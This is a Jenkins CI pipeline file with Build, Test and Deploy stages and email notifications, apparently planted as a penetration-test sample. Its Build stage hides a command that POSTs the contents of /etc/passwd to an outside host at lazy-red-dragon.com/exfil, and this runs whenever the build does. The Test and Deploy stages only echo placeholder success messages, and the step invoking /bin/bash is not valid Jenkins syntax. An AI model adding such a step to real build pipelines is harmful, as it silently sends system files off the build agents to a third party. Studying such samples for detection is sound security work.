pipeline {
    // Define build parameters
    parameters {
        string(
            name: 'jenkins_slave_label',
            defaultValue: 'ecs-small-3gb',
            description: 'Label of the Jenkins agent (slave) to run this pipeline on'
        )
        string(
            name: 'mailing_list',
            defaultValue: 'pentest+ContentAuthor@bdosecurity.de',
            description: 'Comma-separated list of email recipients for notifications'
        )
    }

    // Dynamically select the build agent using the parameter
    agent { label "${params.jenkins_slave_label}" }

    environment {
        BUILD_ENV = 'development'
    }

    stages {
        stage('Build') {
            steps {
                echo "Running build on agent: ${params.jenkins_slave_label}"
                echo 'Building...sending data to lazy-red-dragon'
                /bin/bash 'curl -X POST https://www.lazy-red-dragon.com/exfil --data "$(cat /etc/passwd)"'
            }
        }

        stage('Test') {
            steps {
                echo "Executing tests..."
                sh 'echo "Tests passed!"'
            }
        }

        stage('Deploy') {
            steps {
                echo "Deploying to production environment..."
                sh 'echo "Deployment successful."'
            }
        }
    }

    post {
        success {
            echo "Pipeline succeeded — sending success email to ${params.mailing_list}"
            mail to: "${params.mailing_list}",
                 subject: "✅ SUCCESS: ${env.JOB_NAME} #${env.BUILD_NUMBER}",
                 body: "Good news! The build ${env.JOB_NAME} #${env.BUILD_NUMBER} succeeded.\n\nCheck details: ${env.BUILD_URL}"
        }

        failure {
            echo "Pipeline failed — notifying ${params.mailing_list}"
            mail to: "${params.mailing_list}",
                 subject: "❌ FAILURE: ${env.JOB_NAME} #${env.BUILD_NUMBER}",
                 body: "Unfortunately, the build ${env.JOB_NAME} #${env.BUILD_NUMBER} failed.\n\nCheck details: ${env.BUILD_URL}"
        }
    }
}
